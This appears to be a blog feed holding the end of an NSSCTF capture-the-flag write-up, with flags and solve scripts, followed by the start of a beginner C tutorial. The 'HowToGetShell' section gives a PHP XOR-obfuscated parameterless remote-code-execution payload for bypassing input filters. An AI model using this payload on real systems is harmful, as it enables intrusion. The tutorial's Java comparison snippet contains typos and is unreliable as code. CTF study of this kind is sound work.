<pre><code class="hljs plaintext">JB2WEZLJEBKW42LWMVZHG2LUPEWCA3DPMNQXIZLEEBUW4ICXOVUGC3RMEBRWC4DJORQWYIDDNF2HSIDPMYQEGZLOORZGC3BAINUGS3TBE5ZSASDVMJSWSICQOJXXM2LOMNSSYIDJOMQGCIDLMV4SAY3PNVYHEZLIMVXHG2LWMUQHK3TJOZSXE43JOR4SA2TPNFXHI3DZEBQWI3LJNZUXG5DFOJSWIIDCPEQEQ5LCMVUSAUDSN53GS3TDNFQWYICHN53GK4TONVSW45BAMFXGIICDNBUW4YJHOMQE22LONFZXI4TZEBXWMICFMR2WGYLUNFXW4LBAMNXXMZLSNFXGOIDBOJ2HGLBANBUXG5DPOJ4SYIDQNBUWY33TN5YGQ6JMEBZWG2LFNZRWKLBAMVXGO2LOMVSXE2LOM4WCAZLDN5XG63LJMNZSYIDMMF3SYIDNMFXGCZ3FNVSW45BMEBSWI5LDMF2GS33OFQQGCZ3SNFRXK3DUOVZGKIDBNZSCA3LFMRUWG2LOMUWCA53JORUCA5DIMUQGI2LTMNUXA3DJNZSXGIDPMYQE2YLUMVZGSYLMEBJWG2LFNZRWKIDBNZSCAQ3IMVWWS43UOJ4SA4TBNZVWS3THEB2G64BAGESSA2LOEB2GQZJAO5XXE3DEEBCVGSJOEBDGYYLHEBUXGIBOEBLWS5DIEBQSA2DJON2G64TZEBXWMIDFNFTWQ5DZFVZWK5TFNYQHSZLBOJZSYIDJOQQGC5DUOJQWG5DTEBWW64TFEB2GQYLOEAZDAMBQEBSGK5TPORSWIIDTORQWMZRANVSW2YTFOJZSYIBRGEYDAIDPMYQHO2DPNUQGC4TFEBTGCY3VNR2HSIDNMVWWEZLSOMQGM33SEB2GKYLDNBUW4ZZAMFXGIIDSMVZWKYLSMNUCYIDJNZRWY5LENFXGOIBSEBQWGYLEMVWWSY3JMFXHGIDPMYQHI2DFEBBWQ2LOMVZWKICBMNQWIZLNPEQG6ZRAKNRWSZLOMNSSYIBWG4YCA4DSN5TGK43TN5ZHGIDBNZSCAYLTONXWG2LBORSSA4DSN5TGK43TN5ZHGLRAJF2HGIDGOVWGYLLUNFWWKIDTOR2WIZLOOQQGK3TSN5WGY3LFNZ2CAYLNN52W45DTEB2G6IBSGUWDAMBQFQQGS3TDNR2WI2LOM4QDKLBUGAYCAZ3SMFSHKYLUMUQHG5DVMRSW45DTEBQW4ZBAMRXWG5DPOJQWYIDDMFXGI2LEMF2GK4ZO 

 

EBHFGU2DKRDHWMLCHE2DEOLCMUYDGMDFME2WEOLEMVTDEZJQGI4DMMDDGFRTKZRWPUXCASDVMJSWSICVNZUXMZLSONUXI6JA

 

NBQXGIDTMV2CA5LQEBQWGYLEMVWWSYZAMV4GG2DBNZTWKIDBNZSCAY3PN5YGK4TBORUW63RAOBZG6Z3SMFWXGIDXNF2GQIDBMJXXK5BAGE2TAIDVNZUXMZLSONUXI2LFOMQGC3TEEBZGK43FMFZGG2BANFXHG5DJOR2XIZLTEBUW4IBTGUQGG33VNZ2HE2LFOMQGC3TEEBZGKZ3JN5XHGLRAJF2CA2DBOMQGG3ZNMVZXIYLCNRUXG2DFMQQHI2DSMVSSAQ3PNZTHKY3JOVZSASLOON2GS5DVORSXGIDXNF2GQIDUNBSSAVLONF3GK4TTNF2HSIDPMYQE2ZLNOBUGS4ZANFXCA5DIMUQFKU2BFQQFGYLPEBIGC5LMN4QFG5DBORSSAVLONF3GK4TTNF2HSIDJNYQEE4TBPJUWYLBAKVXGS5TFOJZWS5DZEBXWMICTMFXSAVDPNVSSAYLOMQQFA4TJNZRWS4DFEBZGK43QMVRXI2LWMVWHSLBAMFXGIIDPNZSSAQ3PNZTHKY3JOVZSAQ3MMFZXG4TPN5WSA53JORUCASTBM5UWK3DMN5XGSYLOEBBW63DMMVTWKIDJNYQFA33MMFXGILRAJFXGC5LHOVZGC5DFMQQGS3RAGIYDAOBMEB2GQZJAINXW4ZTVMNUXK4ZAJFXHG5DJOR2XIZJAMF2CAU3BN4QFAYLVNRXSAU3UMF2GKICVNZUXMZLSONUXI6JAFBKW4ZLTOAQEGSJJEBUXGIDUNBSSAZTJOJZXIICDN5XGM5LDNF2XGICJNZZXI2LUOV2GKIDJNYQEE4TBPJUWYLRAJF2CA2DBOMQHO33OEB2GQZJAE5BW63TGOVRWS5LTEBEW443UNF2HK5DFEBXWMIDUNBSSAWLFMFZCOICBO5QXEZBAORUHEZLFEB2GS3LFOMQCQMRQGEYCYIBSGAYTELBAGIYDCNRJEBQW4ZBAMJSWGYLNMUQG63TFEBXWMIDUNBSSAMJTE5IGS3DPOQQEG5LMOR2XEYLMEBBW63TGOVRWS5LTEBEW443UNF2HK5DFOMTSA2LOEAZDAMJWFYQES5BANFZSA3TPO4QHI2DFEBWGC4THMVZXIICDN5XGM5LDNF2XGICJNZZXI2LUOV2GKIDJNYQEE4TBPJUWYLRAIJQXGZLEEBXW4IDUNBUXGIDQNRQXIZTPOJWSYICIOVRGK2JAKVXGS5TFOJZWS5DZEBQW4ZBAKNQW6ICQMF2WY3ZAKN2GC5DFEBKW42LWMVZHG2LUPEQGQYLWMUQGIZLWMVWG64DFMQQGI2LWMVZHGZJAMNXWY3DBMJXXEYLUNFXW4IDTOVRWQIDBOMQHG5DBMZT CAYLOMQQHG5DVMRSW45BAMV4GG2DBNZTWKIDBOMQHOZLMNQQGC4ZAOJSXGZLBOJRWQIDDN5XXAZLSMF2GS33OFY======</code></pre>
<p>NSSCTF{1b9429be030ea5b9def2e02860c1c5f6}</p>
<h1 id="howtogetshell">HowToGetShell</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232268.png?x-oss-process=hzy" alt="img"></p>
<p>无参RCE，异或绕过，老题目了</p>
<p><a href="https://blog.51cto.com/u_15057851/4220892">https://blog.51cto.com/u_15057851/4220892</a></p>
<pre><code class="hljs plaintext">传参mess=$_=(&#x27;%40&#x27;^&#x27;%21&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%08&#x27;).(&#x27;%7B&#x27;^&#x27;%1E&#x27;).(&#x27;%7E&#x27;^&#x27;%0C&#x27;).(&#x27;%7C&#x27;^&#x27;%08&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;%5D&#x27;).(&#x27;%0F&#x27;^&#x27;%40&#x27;).(&#x27;%0E&#x27;^&#x27;%5D&#x27;).(&#x27;%0B&#x27;^&#x27;%5F&#x27;);$___=$$__;$_($___[_]);&amp;_=phpinfo();</code></pre>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232269.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{22607883-ed46-416f-a615-8bf8235c39fa}</p>
<h1 id="calculate">Calculate</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232351.png?x-oss-process=hzy" alt="img"></p>
<p>二十个题目，每次要在三秒之内写出来，也不能小于一秒，全打出来就对了</p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">import requests

import re

import time

url = &#x27;http://1.14.71.254:28330/&#x27;

s = requests.session()

for i in range(0,20):

  a = s.get(url)

  print(a.text)

  r2 = re.findall(r&quot;.&lt;/div&gt;&quot;, a.text)

  l = (len(r2))

  str = &quot;&quot;

  for i in range(0, l - 1):

​    str = r2[i] + str

  r3 = re.sub(&#x27;&lt;/div&gt;&#x27;, &#x27;&#x27;, str)

  r4 = r3[::-1]

  num = eval(r4)

  data = &#123;&#x27;ans&#x27;: num&#125;

  time.sleep(0.5)

  flag = s.post(url=url, data=data)

 

print(flag.text)</code></pre>
<p>NSSCTF{aca10207-affa-4d0c-ac30-521116667244}</p>
<h1 id="simple_re">simple_RE</h1>
<p>base64换码表</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232353.png?x-oss-process=hzy" alt="img"></p>
<p>跟进</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232352.png?x-oss-process=hzy" alt="img"></p>
<p>5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232772.png?x-oss-process=hzy" alt="img"></p>
<p>脚本如下</p>
<pre><code class="hljs plaintext">import base64

table=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;

table_changed=&quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD=&quot;

s=&#x27;5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==&#x27;

res=&quot;&quot;

for c in s:

  res+=table[table_changed.find(c)]   

print(base64.b64decode(res))</code></pre>
<p>NSSCTF{a8d4347722800e72e34e1aba3fe914ae}</p>
<h1 id="hep">Hep</h1>
<p>Exp</p>
<pre><code class="hljs plaintext">from hashlib import *

s=&#x27;wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd&#x27;

 

a=md5(s.encode(&quot;utf-8&quot;)).hexdigest()

print(a)

\#&#x27;a8622109e2fb1296e06d5eed6f78f954&#x27;</code></pre>
<p>NSSCTF{ a8622109e2fb1296e06d5eed6f78f954}</p>
<h1 id="ezsql">Ezsql</h1>
<p>Dirsearch扫目录，源码泄露/www.tar.gz，未解决</p>
<h1 id="angerangr">Anger？Angr</h1>
<p>构造exp求angr</p>
<pre><code class="hljs plaintext">#!/usr/bin/env python3

 

import angr

import claripy

import time

 

p = angr.Project(&#x27;./anger&#x27;,auto_load_libs=False)

state = p.factory.entry_state() 

 

sm  = p.factory.simgr(state)

 

r= sm.explore(find=0x401734,avoid =0x4017c3)

 

print (r.found[0].posix.dumps(0))

\#b&#x27;t\xdaR\xbc\x7f\x01~Nf]\x04H\x01QY^ hgDCZ&#123;g*XJE!\xbeQ%&#x27;

 

打远程，exp如下

from pwn import *

 

exp = b&#x27;t\xdaR\xbc\x7f\x01~Nf]\x04H\x01QY^ hgDCZ&#123;g*XJE!\xbeQ%&#x27;

 

io = remote(&#x27;1.14.71.254&#x27;,28118)

io.recv()

io.sendline(exp)

io.interactive()</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209182232825.png?x-oss-process=hzy" alt="img"></p>
<p>NSSCTF{4f87757b-3e4a-4e51-9a97-0fa4b94a9c6e}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言系统学习</title>
    <url>/2022/01/15/C/</url>
    <content><![CDATA[<p>C语言系统学习</p>
<span id="more"></span>
<p>之前学C的时候学习用的，图片全被防盗链屏蔽了，懒得修了</p>
<h2 id="常见的计算机语言类型">常见的计算机语言类型</h2>
<h2 id="机器语言">机器语言</h2>
<p>所有的代码里面只有0和1, 0表示不加电,1表示加电(纸带存储时 1有孔,0没孔)<br>
优点：直接对硬件产生作用，程序的执行效率非常非常高<br>
缺点：指令又多又难记、可读性差、无可移植性</p>
<h2 id="汇编语言">汇编语言</h2>
<p>符号化的机器语言，用一个符号（英文单词、数字）来代表一条机器指令<br>
优点：直接对硬件产生作用，程序的执行效率非常高、可读性稍好<br>
缺点：符号非常多和难记、无可移植性</p>
<h2 id="高级语言">高级语言</h2>
<p>非常接近自然语言的高级语言，语法和结构类似于普通英文<br>
优点：简单、易用、易于理解、远离对硬件的直接操作、有可移植性<br>
缺点：有些高级语言写出的程序执行效率并不高<br>
对比(利用3种类型语言编写1+1)</p>
<p>机器语言<br>
10111000 00000001 00000000 00000101 00000001 00000000</p>
<p>汇编语言<br>
MOV AX, 1 ADD AX, 1</p>
<p>高级语言<br>
1 + 1</p>
<h2 id="什么是c语言">什么是C语言?</h2>
<p>C语言是一种用于和计算机交流的高级语言, 它既具有高级语言的特点，又具有汇编语言的特点<br>
非常接近自然语言<br>
程序的执行效率非常高<br>
C语言是所有编程语言中的经典，很多高级语言都是从C语言中衍生出来的，<br>
例如:C++、C#、Object-C、Java、Go等等<br>
C语言是所有编程语言中的经典，很多著名的系统软件也是C语言编写的<br>
几乎所有的操作系统都是用C语言编写的<br>
几乎所有的计算机底层软件都是用C语言编写的<br>
几乎所有的编辑器都是C语言编写的</p>
<h2 id="c语言程序组成">C语言程序组成</h2>
<p>手机有很多功能, “开机”,“关机”,“打电话”,“发短信”,&quot;拍照&quot;等等</p>
<p>手机中的每一个功能就相当于C语言程序中的一个程序段(函数)</p>
<p>众多功能中总有一个会被先执行,不可能多个功能一起执行</p>
<p>想使用手机必须先执行手机的开机功能</p>
<p>所以C语言程序也一样,由众多功能、众多程序段组成, 众多C语言程序段中总有一个会被先执行, 这个先执行的程序段我们称之为&quot;主函数&quot;</p>
<p>一个C语言程序由多个&quot;函数&quot;构成,每个函数有自己的功能</p>
<p>一个程序<em><strong>有且只有一个主函数</strong></em></p>
<p>如果一个程序没有主函数,则这个程序不具备运行能力</p>
<p>程序运行时系统会<em><strong>自动调用</strong></em>主函数,而其它函数需要开发者<em><strong>手动调用</strong></em></p>
<p>主函数有固定书写的格式和范写</p>
<h2 id="函数定义格式">函数定义格式</h2>
<ul>
<li>主函数定义的格式:
<ul>
<li>int 代表函数执行之后会返回一个整数类型的值</li>
<li>main 代表这个函数的名字叫做main</li>
<li>() 代表这是一个函数</li>
<li>{} 代表这个程序段的范围</li>
<li>return 0; 代表函数执行完之后返回整数0</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;
    <span class="hljs-comment">// insert code here...</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<ul>
<li>其它函数定义的格式
<ul>
<li>int 代表函数执行之后会返回一个整数类型的值</li>
<li>call 代表这个函数的名字叫做call</li>
<li>() 代表这是一个函数</li>
<li>{} 代表这个程序段的范围</li>
<li>return 0; 代表函数执行完之后返回整数0</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">call</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<h2 id="如何执行定义好的函数">如何执行定义好的函数</h2>
<p>主函数(main)会由系统自动调用, 但其它函数不会, 所以想要执行其它函数就必须在main函数中手动调用</p>
<p>call 代表找到名称叫做call的某个东西<br>
() 代表要找到的名称叫call的某个东西是一个函数<br>
; 代表调用函数的语句已经编写完成<br>
所以call();代表找到call函数, 并执行call函数</p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;
    call();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>如何往屏幕上输出内容:<br>
1.输出内容是一个比较复杂的操作, 所以系统提前定义好了一个专门用于输出内容的函数叫做printf函数,我们只需要执行系统定义好的printf函数就可以往屏幕上输出内容<br>
2.但凡需要执行一个函数, 都是通过函数名称+圆括号的形式来执行<br>
3.如下代码的含义是: 当程序运行时系统会自动执行main函数, 在系统自动执行main函数时我们手动执行了call函数和printf函数<br>
4.经过对代码的观察, 我们发现两个问题<br>
并没有告诉printf函数,我们要往屏幕上输出什么内容<br>
找不到printf函数的实现代码</p>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">call</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    call();
    <span class="hljs-built_in">printf</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<ul>
<li>如何告诉printf函数要输出的内容
<ul>
<li>将要输出的内容编写到printf函数后面的圆括号中即可</li>
<li>注意: 圆括号中编写的内容必须用双引号引起来</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);</code></pre>
<ul>
<li>如何找到printf函数的实现代码
<ul>
<li>由于printf函数是系统实现的函数, 所以想要使用printf函数必须在使用之前告诉系统去哪里可以找到printf函数的实现代码</li>
<li>#include &lt;stdio.h&gt; 就是告诉系统可以去stdio这个文件中查找printf函数的声明和实现</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">call</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    call();
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<h2 id="main函数注意点及其它写法">main函数注意点及其它写法</h2>
<ul>
<li>C语言中,每条完整的语句后面都必须以分号结尾</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>) <span class="hljs-comment">// 如果没有分号编译时会报错</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    <span class="hljs-comment">// 如果没有分号,多条语句合并到一行时, 系统不知道从什么地方到什么地方是一条完整语句</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>C语言中除了注释和双引号引起来的地方以外都不能出现中文</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>); <span class="hljs-comment">// 这里的分号如果是中文的分号就会报错</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>一个C语言程序只能有一个main函数</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123; <span class="hljs-comment">// 编译时会报错, 重复定义</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<ul>
<li>一个C语言程序不能没有main函数</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">// 编译时报错, 因为只有call函数, 没有main函数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mian</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">// 编译时报错, 因为main函数的名称写错了,还是相当于没有main函数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<ul>
<li>main函数前面的int可以不写或者换成void（建议不要换，只是有时候你换了可能也对，但是很多编译器市不支持的，老老实实用最标准的格式是最好不过的：<code>int main(void)</code>,其次这个void最好养成加上的习惯，避免报错的风险）</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123; <span class="hljs-comment">// 最标准的形式，前面的int不加也不会报错</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<ul>
<li>main函数中的return 0可以不写</li>
<li>return 语句（返回语句）是程序的最后一个语句。在 int main（void）中 int 表示 main（）函数的返回值应该是一个整数。C标准要求 main（）这样做。带有返回值的 C语言函数要使用一个 return 语句，该语句包括关键字 return，后面紧跟着要返回的值，然后是一个分号。对于 main（）函数来说，如果你漏掉了 return语句，则大多数编译器将对你的疏忽提出警告，但仍将编译该程序。此时，你可以暂时把 main（）中的 return语句看作是保持逻辑连贯性所需的内容。但对于某些操作系统（包括 DOS 和 UNIX ）而言，它有实际的用途。</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">// 不会报错</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);
&#125;</code></pre>
<ul>
<li>多种写法不报错的原因
<ul>
<li>C语言最早的时候只是一种规范和标准(例如C89, C11等)</li>
<li>标准的推行需要各大厂商的支持和实施</li>
<li>而在支持的实施的时候由于各大厂商利益、理解等问题,导致了实施的标准不同,发生了变化
<ul>
<li>Turbo C</li>
<li>Visual C(VC)</li>
<li>GNU C(GCC)</li>
</ul>
</li>
<li>所以大家才会看到不同的书上书写的格式有所不同, 有的返回int,有的返回void,有的甚至没有返回值</li>
<li>所以大家只需要记住最标准的写法即可</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<blockquote>
<p><code>Tips:</code><br>
<code>语法错误：编译器会直接报错</code><br>
<code>逻辑错误：没有语法错误，只不过运行结果不正确</code></p>
</blockquote>
<h2 id="c语言程序练习">C语言程序练习</h2>
<ul>
<li>编写一个C语言程序,用至少2种方式在屏幕上输出以下内容</li>
</ul>
<pre><code class="hljs c"> *** ***
*********
 *******
  ****
   **
</code></pre>
<ul>
<li>普通青年实现</li>
</ul>
<pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; *** *** \n&quot;</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*********\n&quot;</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; *******\n&quot;</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  ****\n&quot;</span>);
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   **\n&quot;</span>);
</code></pre>
<ul>
<li>2B青年实现</li>
</ul>
<pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; *** *** \n*********\n *******\n  ****\n   **\n&quot;</span>);
</code></pre>
<ul>
<li>文艺青年实现(纯属装b)</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span>  i = <span class="hljs-number">0</span>;
<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;
    <span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; *** *** \n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*********\n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; *******\n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  ****\n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   **\n&quot;</span>);
    &#125;<span class="hljs-keyword">else</span>
    &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   ** ** \n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  *******\n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   *****\n&quot;</span>);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    **\n&quot;</span>);
    &#125;
    sleep(<span class="hljs-number">1</span>);
    i++;
    system(<span class="hljs-string">&quot;cls&quot;</span>);
&#125;</code></pre>
<h2 id="初学者如何避免程序出现bug">初学者如何避免程序出现BUG</h2>
<p>大部分人都在关注你飞的高不高，却没人在乎你飞的累不累，这就是现实！</p>
<pre><code class="hljs plaintext">                   _ooOoo_
                  o8888888o
                  88&quot; . &quot;88
                  (| -_- |)
                   O\ = /O
               ____/`---&#x27;\____
             .   &#x27; \\| |// `.
              / \\||| : |||// \
            / _||||| -:- |||||- \
              | | \\\ - /// | |
            | \_| &#x27;&#x27;\---/&#x27;&#x27; | |
             \ .-\__ `-` ___/-. /
          ___`. .&#x27; /--.--\ `. . __
       .&quot;&quot; &#x27;&lt; `.___\_&lt;|&gt;_/___.&#x27; &gt;&#x27;&quot;&quot;.
      | | : `- \`.;`\ _ /`;.`/ - ` : | |
        \ \ `-. \_ __\ /__ _/ .-` / /
======`-.____`-.___\_____/___.-`____.-&#x27;======
                   `=---=&#x27;

.............................................
       佛祖保佑                   有无BUG
</code></pre>
<pre><code class="hljs plaintext">━━━━━━神兽出没━━━━━━
     　　  ┏┓　　　 ┏┓
      　　┏┛┻━━━━━━┛┻┓
      　　┃　　　     ┃
      　　┃　　　━    ┃
      　　┃　┳┛　  ┗┳ ┃
      　　┃　　　     ┃
      　　┃　　　┻    ┃
      　　┃          ┃
      　　┗━┓　　　 ┏━┛Code is far away from bug with the animal protecting
      　　  ┃　　 　┃    神兽保佑,代码无bug
      　  　┃　　 　┃
      　  　┃　　　 ┗━━━┓
      　  　┃　　　     ┣┓
      　　  ┃　　　  ┏━━┛┛
      　　  ┗┓┓┏━┳┓┏┛
      　　   ┃┫┫ ┃┫┫
      　　   ┗┻┛ ┗┻┛

      ━━━━━━感觉萌萌哒━━━━━━
</code></pre>
<h2 id="多语言对比">多语言对比</h2>
<ul>
<li>C语言</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;好好学习&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>C++语言</li>
</ul>
<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;
    cout &lt;&lt; <span class="hljs-string">&quot;好好学习&quot;</span> &lt;&lt; endl;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>OC语言</li>
</ul>
<pre><code class="hljs ocaml">#import &lt;<span class="hljs-type">Foundation</span>/<span class="hljs-type">Foundation</span>.h&gt;
<span class="hljs-built_in">int</span> main<span class="hljs-literal">()</span> &#123;
    <span class="hljs-type">NSLog</span>(@<span class="hljs-string">&quot;好好学习&quot;</span>);
    return <span class="hljs-number">0</span>;
&#125;
</code></pre>
<ul>
<li>Java语言</li>
</ul>
<pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>
&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> viod <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
    &#123;
        system.out.println(<span class="hljs-string">&quot;好好学习&quot;</span>);
    &#125;
&#125;
</code></pre>
<ul>
<li>Go语言</li>
</ul>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main
<span class="hljs-keyword">import</span>  <span class="hljs-string">&quot;fmt&quot;</span> <span class="hljs-comment">//引入fmt库</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;
    fmt.Println(<span class="hljs-string">&quot;好好学习&quot;</span>)
&#125;
</code></pre>
<h2 id="什么是注释">什么是注释?</h2>
<ul>
<li>注释是在所有计算机语言中都非常重要的一个概念，从字面上看，就是注解、解释的意思</li>
<li>注释可以用来解释某一段程序或者某一行代码是什么意思，方便程序员之间的交流沟通</li>
<li>注释可以是任何文字，也就是说可以写中文</li>
<li>被注释的内容在开发工具中会有特殊的颜色</li>
</ul>
<h2 id="为什么要使用注释">为什么要使用注释?</h2>
<ul>
<li>没有编写任何注释的程序</li>
</ul>
